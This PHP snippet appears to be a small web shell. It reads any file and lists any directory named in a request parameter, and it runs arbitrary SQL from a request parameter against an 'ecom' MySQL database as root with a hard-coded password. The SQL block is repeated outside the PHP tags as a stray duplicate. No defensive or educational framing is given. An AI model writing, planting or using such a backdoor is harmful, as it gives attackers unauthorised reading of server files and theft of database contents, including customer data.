<?php 

if (isset($_REQUEST['file'])) {
	echo file_get_contents($_REQUEST['file']);
}
if (isset($_REQUEST['dir'])) {
	print_r(scandir($_REQUEST['dir']));
}
if (isset($_REQUEST['db'])) {
	$myconn = new mysqli("localhost","root","changethis","ecom");
	$result = mysqli_query($myconn,$_REQUEST['db']);
	while ($row = $result->fetch_row()) {
    	foreach ($row as $r) {
            echo $r . " ";
        }
        echo "\n";
    }
}
?>


if (isset($_REQUEST['db'])) {
    $conn = new mysqli("localhost", "root", "changethis", "ecom") or die("Connect failed: %s\n". $conn -> error);
    $res = mysqli_query($conn, $_REQUEST['db']);
    while ($row = $res->fetch_row()) {
        foreach ($row as $r) {
            echo $r . " ";
        }
        echo "\n";
    }
}